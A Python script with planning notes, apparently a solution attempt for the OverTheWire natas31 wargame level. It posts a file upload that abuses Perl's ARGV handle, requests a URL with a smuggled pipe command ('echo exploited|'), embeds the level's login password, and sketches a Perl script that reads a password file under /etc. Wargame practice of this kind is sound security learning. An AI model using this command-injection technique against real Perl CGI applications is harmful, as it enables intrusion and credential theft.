import requests
session = requests.Session()

"""
A few things I have noticed

################################################################################

You have this line:
$ENV{'TMPDIR'}="WWWDIR/tmp/";

So our file get's uploaded to this location
However things are not that easy...

http://natas31.natas.labs.overthewire.org/tmp/
--->
Forbidden
You don't have permission to access /tmp/ on this server.

Which probably means that those only have have only write permissions from us
The rest is all done internal

################################################################################

Therefore (I think) this attack needs to happen in 2 stages...

1. Upload a (shellcode, or perl script) to the tmp directory
2. Upload another file that runs our malicious upload
--> Let the return be nicely printed in table format

**1**
# read_file.pl
# This perl script wil read the natas password file into memory and print it as a string
my $file = "/etc/natas_webpass/natas31";
my $document = do {
    local $/ = undef;
    open my $fh, "<", $file
        or die "could not open $file: $!";
    <$fh>;
};
print $document;

**2**
# This is going to be a little harder :)
# We need to know the exact location fo the file on the server
# We might need to add this to a dsv to be able to print this?
# do || `` || system() || eval() --- All let us run other perl scripts
do '/tmp/read_file.pl';
"""

def natas31(url):
    with open('abc.txt', 'wb') as _file:
        _file.write(b"just test") 

    _files = [('file', open('abc.txt', 'rb'))]
    response = session.post(url, files=_files, data={'file':'ARGV',"submit": "Upload"})
    print(response.text)

if __name__ == '__main__':
    url = 'http://natas31:hay7aecuungiuKaezuathuk9biin0pu1@natas31.natas.labs.overthewire.org/index.pl?echo%20exploited|'
    natas31(url)
